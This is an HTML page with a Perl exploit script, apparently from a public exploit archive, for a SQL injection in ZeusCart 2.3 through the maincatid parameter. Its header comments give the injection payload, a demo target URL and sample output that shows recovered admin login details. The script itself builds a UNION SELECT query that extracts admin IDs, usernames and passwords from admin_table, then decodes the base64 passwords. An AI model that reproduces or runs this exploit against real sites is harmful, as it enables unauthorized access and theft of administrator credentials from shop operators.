<html><head><title>ZeusCart <= 2.3 (maincatid) SQL Injection Vulnerability</title></head><pre>#!usr/bin/perl
#|------------------------------------------------------------------------------------------------------------------
#| -Info:
#
#| -Name: Zeus Cart V 2.3
#| -Site: http://www.zeuscart.com/
#| -Site Demo: http://www.zeuscart.com/onlinedemo.php?action=skip
#| -Bug: Sql Injection
#| -Found: by Br0ly
#| -BRAZIL &gt;D
#| -Contact: br0ly[dot]Code[at]gmail[dot]com
#|
#| -Gretz: Osirys , xs86 , str0ke
#|
#| -p0c:
#| -SQL INJECTION:
#| 
#| -9999+union+all+select+0--
#|
#| - Demo ONline:
#|
#| -&gt; http://ajdemos.com/demo/zeuscart/v23/?do=featured&amp;action=showmaincatlanding&amp;maincatid=[SQL]
#|   
#|
#| -Exploit: Demo:
#|
#|perl zeuscart.txt http://ajdemos.com/demo/zeuscart/v23/
#|
#|  --------------------------------------
#|   -Zeus Cart V2.3                  
#|   -Sql Injection                      
#|   -by Br0ly                           
#|  --------------------------------------
#|
#|[+] Getting the login,pass
#|
#|[+] User   = demoadmin
#|[+] Pass   = demo123
#|
#|
#| ;D
#|

  use IO::Socket::INET;
  use LWP::UserAgent;
  use MIME::Base64;
 
   my $host    = $ARGV[0];
   my $sql_path = &quot;/?do=featured&amp;action=showmaincatlanding&amp;maincatid=&quot;;
   
 
  if (@ARGV &lt; 1) {
      &amp;banner();
      &amp;help(&quot;-1&quot;);
  }

  elsif(cheek($host) == 1) {
      &amp;banner();
      &amp;xploit($host,$sql_path);
  }
 
  else {
      &amp;banner();
      help(&quot;-2&quot;);
  }
 
  sub xploit() {

      my $host     = $_[0];
      my $sql_path = $_[1];

      print &quot;[+] Getting the login,pass\n\n&quot;;

      my $sql_atk = $host.$sql_path.&quot;-9999+union+all+select+concat(0x6272306c79,0x3a,admin_id,0x3a,admin_name,0x3a,admin_password,0x3a,0x6272306c79)+from+admin_table--&quot;;
      my $sql_get = get_url($sql_atk);
      my $connect = tag($sql_get);
     
      if($connect =~ /br0ly:(.+):(.+):(.+):br0ly/) {
   
    my $id   = $1;
    my $user = $2;
    my $pass = $3;

      if($id =~ /(.+):/) {
     
      my $id_2 = $1;
      }
     
    my $pass_aux =  base64_decode($pass);

    print &quot;[+] User   = $user\n&quot;;
    print &quot;[+] Pass   = $pass_aux\n&quot;;
   
    exit(0);
      }
      else {
    print &quot;[-] Exploit, Fail\n&quot;;
    exit(0);
     
      }
 }

   sub get_url() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
  }

  sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
  }

  sub cheek() {
    my $host  = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
  }

  sub base64_decode () {
   
    my $str_1 = $_[0];
    my $str_decode = decode_base64($str_1);
    return $str_decode;
  }


  sub help() {

    my $error = $_[0];
    if ($error == -1) {
        print &quot;\n[-] Error, missed some arguments !\n\n&quot;;
    }
   
    elsif ($error == -2) {

        print &quot;\n[-] Error, Bad arguments !\n&quot;;
    }
 
    print &quot;[*] Usage : perl $0 http://localhost/zeuscart/\n\n&quot;;
    print &quot;    Ex:     perl $0 http://localhost/zeuscart/\n\n&quot;;
    exit(0);
  }

  sub banner {
    print &quot;\n&quot;.
          &quot;  --------------------------------------\n&quot;.
          &quot;   -Zeus Cart V2.3                   \n&quot;.
          &quot;   -Sql Injection                       \n&quot;.
          &quot;   -by Br0ly                            \n&quot;.
          &quot;  --------------------------------------\n\n&quot;;
  }

# milw0rm.com [2009-05-29]</pre></html>